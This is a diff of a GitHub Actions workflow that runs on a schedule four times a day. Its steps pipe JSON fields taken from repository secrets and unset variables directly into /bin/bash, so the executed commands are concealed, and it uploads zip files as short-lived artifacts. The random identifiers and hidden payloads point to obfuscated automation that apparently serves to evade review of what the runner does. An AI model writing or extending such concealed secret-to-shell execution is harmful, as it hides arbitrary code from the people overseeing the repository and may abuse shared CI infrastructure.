@@ -1,27 +1,26 @@
 name: sanzidatao
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '7 0/6 * * *'
 
-jobs:  # 18048
+  schedule:
+    - cron: '20 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: sanzidatao
         env:
-          zbqts4: ${{ secrets.zbqts4 }}
+          qvnd781: ${{ secrets.qvnd781 }}
         run: |
-          echo $zbqts4 | jq -r .qeyp1 | /bin/bash
-          echo $xruu8 | jq -r .bdhh437 | /bin/bash
-          echo $q08285 | jq -r .e0373 | /bin/bash
-          echo $fgdcd02516 | jq -r .ha49991 | /bin/bash
-          echo $r58241 | jq -r .owqz4 | /bin/bash
-          echo $y5 | jq -r .esmuk6 | /bin/bash
-          echo $orzlk8 | jq -r .gtrw36 | /bin/bash
-          echo $grh75 | jq -r .qvdun94497 | /bin/bash
-          echo $ahm3865 | jq -r .kmh1237 | /bin/bash
-          echo $bz9 | jq -r .a2473 | /bin/bash
+          printf '%s' "$qvnd781" | jq -r .ovx4196 | /bin/bash
+          echo $kgix22086 | jq -r .u3658 | /bin/bash
+          printf '%s' "$fanut79" | jq -r .iwe118 | /bin/bash
+          echo $fl57 | jq -r .blw65948 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: aHBENARS
+          path: "*.zip"
+          retention-days: 1
